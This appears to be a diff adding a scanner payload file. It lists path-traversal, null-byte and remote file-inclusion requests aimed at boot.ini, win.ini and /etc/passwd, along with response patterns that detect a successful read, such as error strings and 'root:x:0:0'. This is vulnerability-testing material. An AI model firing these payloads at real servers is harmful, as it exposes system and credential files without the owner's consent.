@@ -1,0 +1,28 @@
+<request>../../../../../../../../../../../../../../../boot.ini
+../../../../../../../../../../../../../../../boot.ini.html
+C:\boot.ini
+C:\boot.ini
+C:\boot.ini.html
+%SYSTEMROOT%\win.ini
+%SYSTEMROOT%\win.ini
+%SYSTEMROOT%\win.ini.html
+../../../../../../../../../../../../../../../etc/passwd%00.html
+/etc/passwd%00.html
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd.html
+/etc/passwd
+https://raw.githubusercontent.com/code-scan/GourdScan/master/README.md?</request>
+<respone>java.io.FileNotFoundException:
+java.lang.Exception:
+java.lang.IllegalArgumentException:
+java.net.MalformedURLException:
+The server encountered an internal error \(.*\) that prevented it from fulfilling this request.
+The requested resource \(.*\) is not available.
+fread\(\):
+for inclusion '\(include_path=
+Failed opening requiredv
+<b>Warning</b>:  file\(
+<b>Warning</b>:  file_get_contents\(
+root:x:0:0:root:
+# GourdScan</respone>
